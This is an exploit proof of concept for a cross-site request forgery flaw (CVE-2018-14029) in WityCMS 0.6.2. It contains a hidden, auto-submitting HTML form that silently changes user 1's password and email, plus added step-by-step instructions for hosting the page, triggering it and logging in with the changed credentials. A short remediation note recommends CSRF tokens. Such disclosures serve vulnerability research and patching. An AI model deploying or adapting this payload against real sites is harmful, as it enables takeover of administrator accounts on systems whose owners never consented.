<!--
# Exploit Title: WityCMS 0.6.2 - Cross-Site Request Forgery (Password Change)
# Vendor Homepage: https://creatiwity.net/witycms
# Software Link: https://github.com/Creatiwity/wityCMS/releases/tag/0.6.2
# Exploit Author: Porhai Eung
# Website: http://www.chhaipov.com
# CVE: CVE-2018-14029
# Category: webapps


1. Description

CSRF vulnerability in admin/user/edit in Creatiwity wityCMS 0.6.2 allows an attacker to take over a user account by modifying user's data such as email and password

2. Exploit and Proof of Concept

To exploit this vulnerability, victim need to be logged in at target site namely victim.com and visit crafted site made by attacker namely attacker.com. Then an authenticated POST request will be generated from victim browser and it will be submit to victim.com to modify user's data to attacker desired value.

- POC hosted at attacker.com
-->

</div>
  <iframe id="test" name="test" style="display:none">
    </iframe>
    <form action="http://victim.com/wity/admin/user/edit/1" method="post" id="the_form" style="display:none" target="test">
        <input type="hidden" name="id" value="1"  />
        <input type="hidden" name="nickname" value="admin"  />
        <input type="hidden" name="password" value="csrf123"  />
        <input type="hidden" name="password_conf" value="csrf123"  />
        <input type="hidden" name="email" value="csrf@test.com"  />
        <input type="hidden" name="groupe" value="0"  />
        <input type="hidden" name="type" value="all"  />
        <input type="submit" value="Change Password"  />
    </form>
    <script type="text/javascript">
    //<![CDATA[
        var $form = document.getElementById ('the_form');
        $form.submit ();
    //]]>
    </script>
</div>

<!--
3. Solution

- Original password is needed in order to change new password of user
- Implement CSRF token
-->


Instruction:


WityCMS Installation:

Ensure WityCMS version 0.6.2 is installed and accessible on your target server.
Administrator Access:

You need to have an administrator account logged into the WityCMS application.

Create a new HTML file with the exploit. This exploit will simulate a request to change a user's password and email. Replace <target-ip> with the IP address or domain of the WityCMS server.
Save the file as csrf_exploit.html.
Host this file on a web server or share it through a file-sharing service.

Ensure you are logged into the WityCMS application as an administrator.
Open a browser and navigate to the URL where the csrf_exploit.html file is hosted.

The form will automatically submit once the page is loaded.
Monitor the WityCMS application to check if the user account with ID 1 has its password and email changed to csrf123 and csrf@test.com.

Verify that the account details for user ID 1 have been modified.
Try logging in with the new credentials.